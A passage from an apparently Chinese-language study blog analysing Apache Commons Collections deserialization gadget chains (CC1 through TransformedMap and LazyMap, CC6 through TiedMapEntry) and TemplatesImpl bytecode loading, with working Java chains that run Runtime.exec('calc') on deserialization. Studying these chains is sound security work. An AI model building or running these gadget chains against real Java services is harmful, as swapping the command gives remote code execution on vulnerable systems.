<p>该类的构造方法为protected,于是在该类中找有无使用了该构造方法的方法,找到一个<code>decorate</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该方法根据注释是一个用来创建transforming map的工厂方法 </p>
<p>setValue调用了checkSetValue方法,checkSetValue方法又调用了transform方法</p>
<blockquote>
<p>至于为什么会这样呢?</p>
</blockquote>
<p>因为TransformedMap继承了<code>AbstractInputCheckedMapDecorator</code>这个抽象类,这个抽象类中checkSetValue是抽象方法,被<code>TransformedMap</code>实现,所以setValue中<code>parent.checkSetValue</code>调用的就是这个被实现的方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220310150430013.png" alt="image-20220310150430013"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220310150131340.png" alt="image-20220310150131340"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="keyword">null</span>, invokerTransformer);<span class="comment">//返回一个里面对象类型是Transformer map</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorate.entrySet()</span><br><span class="line">             ) &#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接着在setValue上面再拓展,找有没有在readObject中使用了setValue的类</p>
<p>找到AnnoationInvocationHandler中的readObject方法中有使用setValue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>因为Runtime类不能序列化,所以需要将其改装为能够序列化,而Class是可以序列化的</p>
<p><strong>在invoke的时候,如果是静态方法,第一个参数可以为Null</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="line">        Method getRuntime = runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        Object o = (Runtime)getRuntime.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Method exec = runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>继续将其改装为<code>InvokerTransformer</code>中<code>transform</code>方法的版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//逐步改装</span></span><br><span class="line"><span class="comment">//调用getMethod方法获取getRuntime方法</span></span><br><span class="line">        Object getRuntimeMethod = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">//如法炮制,调用invoke方法,获取runtime对象</span></span><br><span class="line">        Object runtime = (Runtime)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line">        <span class="comment">//调用runtime中的exec方法执行命令</span></span><br><span class="line">        Object res = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有个疑问,为什么第一句里面传入的是class而不是对象,但是却可以调用其中的方法?</p>
<p>回到前面的问题,因为Runtime.getRuntime()方法时静态方法,所以传递的第一个参数可以为null,也就是说第一个参数对于invoke没有什么影响??</p>
<p>上面的代码可以通过ChainedTransformer再次缩短</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对于里面的函数会进行递归调用,上一个的执行结果会变成下一个的参数传进去,最后返回最终结果</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">new</span> ChainedTransformer(transformers).transform(Runtime.class);</span><br></pre></td></tr></table></figure>

<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, Chainedtransform);</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        SerializeTest.serialize(o);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br></pre></td></tr></table></figure>





<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>lazyMap中的<code>get</code>方法也调用了<code>transform</code>方法,可以使用其替代<code>TransformedMap.checkSetValue</code></p>
<p>分析一下lazyMap中的<code>get</code>方法的使用</p>
<p>LazyMap顾名思义,就是在创建map的时候不创建key,再get的时候才创建key,并且LazyMap是public的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>使用上述”构造方法”创建LazyMap,接着先调用get试试,分析其只有没有key的map才能进入if循环中调用<code>transform</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            Object value = factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">     </span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, Chainedtransform);</span><br><span class="line">        lazyMap.get(Chainedtransform);</span><br></pre></td></tr></table></figure>

<p>为什么map添加了键值对,还能成功进入<code>if</code>循环</p>
<p>找到<code>containsKey</code>方法的解释是<code>map中的containsKey（key）方法是判断该key在map中是否有key存在。如果存在则返回true。如果不存在则返回false</code>换言之,其判断的是map里面是key是不是在map中存在,而运行时key显然不存在,所以便调用了key的<code>transform方法</code></p>
<p>接下来找能调用<code>get</code>方法的类</p>
<p>还得是<code>AnnotationInvocationHandler</code>类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220312160852089.png" alt="image-20220312160852089"></p>
<p>readObject中的memberTypes是注解的成员变量,无法控制</p>
<p>在该类的<code>invoke</code>方法中有一个get方法的调用</p>
<p>这个类实现了<code>InvocationHandler</code>接口,根据之前学习的java动态代理的使用,只要有它的代理调用了该类中的任何方法,都会调用invoke从而走到调用<code>get</code></p>
<blockquote>
<p>如何在<code>Object result = memberValues.get(member);</code>中将member改为<code>ChainedTransformer</code></p>
</blockquote>
<p>这里其实是我的理解出了问题,经过多次调试,只要通过动态代理调用<code>AnnotationInvocationHandler</code>中的方法,就能执行代码,并且传入到LazyMap中的key参数虽然跟着变化,但是还能执行</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220313155923303.png" alt="image-20220313155923303"></p>
<p>最后找到了原因,因为上一cc链中为了不让AnnotationInvocationHandler改变第一个Transformer中的值,使用了new ConstantTransformer(Runtime.class)在链式调用的时候给下一个Transformer传递值,如果保持这一修改不变,不管外部调用transform方法传递进来的参数是什么,都会被修改为Runtime.class从而执行下去</p>
<blockquote>
<p>得到的教训,遇到不懂的代码要多耐心调试,跟着代码走下去,不要妄想一下就能看明白</p>
</blockquote>
<h4 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h4><p>这条链使用了TiedMapEntry.hashCode中对于getValue的调用而调用的get方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220313175136879.png" alt="image-20220313175136879"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220313175144689.png" alt="image-20220313175144689"></p>
<p>这里调用get传递的参数是key,所以还是使用<code>new ConstantTransformer(Runtime.class)</code>修改传递进去的参数即可,所以实例化的时候key随便传递一个就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;sssfs&quot;</span>);</span><br><span class="line">        <span class="comment">//接着调用它的hashCode方法</span></span><br><span class="line">        tiedMapEntry.hashCode();</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p>接下来利用HashMap反序列化的时候会计算key的hashCode从而调用它的hashCode方法</p>
<p>这条链类似于URLDNS那条链的原理,URLDNS中put调用hashCode会消耗掉它为-1的hashCode,这条链呢则会在put的时候调用hashCode方法,到lazyMap的get方法的时候,会给它添加一个key,导致反序列化的时候已经存在了这个key,导致进不了if循环从而无法调用transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            Object value = factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以可以通过remove移除添加进去的key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">//这里随便传递一个Transformer是为了不在put的时候执行,put完再把ChainedTransformer添加回去</span></span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">123</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,String&gt; map1=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Class&lt;? extends Map&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        Field factory = lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        factory.set(lazyMap,Chainedtransformer);</span><br><span class="line">        SerializeTest.serialize(map);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>注:在学习构造shiro的cc链的时候,shiro中TiedMapEntry第二个参数必须是要transform(key)的key,为什么这里可以乱传递一个呢,因为不管传递的是啥,只要ChainedTransformer开始transform,执行到<code>new ConstantTransformer(Runtime.class)</code>,就会被改成<code>Runtime.class</code></p>
<h3 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h3><p>ClassLoader中有一个defineClass方法,该方法可以从字节码文件加载类,如果能找到一个类既调用了defineClass方法又对类进行了实例化,那么就可以执行类中的静态代码块</p>
<p>ClassLoader中有好多defineClass方法,挨个findUsages,找到一个defineClass在其他包内不是private的调用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220314151530097.png" alt="image-20220314151530097"></p>
<p>接着找,找到一个方法能进行实例化</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220314152458340.png" alt="image-20220314152458340"></p>
<p>在newTransformer这个public方法中调用了它,所以入口找到了,思路就是通过newTransformer</p>
<p>加载完成之后_class数组存储的就是通过字节码加载进来的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//H:\java\classTest\MyClass</span></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*Field transletIndex = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);</span></span><br><span class="line"><span class="comment">        transletIndex.setAccessible(true);</span></span><br><span class="line"><span class="comment">        transletIndex.set(templates,0);*/</span></span><br><span class="line">    	<span class="comment">//这块是想多了,后面判断父类是不是指定的类的时候会对_transletIndex变量做出修改,现在改了也没用</span></span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>大部分都很容易理解,就是后面有一个空指针异常的地方,会判断加载的class是不是继承了<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String ABSTRACT_TRANSLET</span><br><span class="line">    = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220314160724089.png" alt="image-20220314160724089"></p>
<p>所以给要加载的类继承该类就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">extends</span> <span class="title">com</span>.<span class="title">sun</span>.<span class="title">org</span>.<span class="title">apache</span>.<span class="title">xalan</span>.<span class="title">internal</span>.<span class="title">xsltc</span>.<span class="title">runtime</span>.<span class="title">AbstractTranslet</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process calc = Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个就多了一种代码执行的方法,在ChainedTransformer中通过<code>transform</code>调用<code>newTransformer()</code>方法从而加载指定类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        </span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span 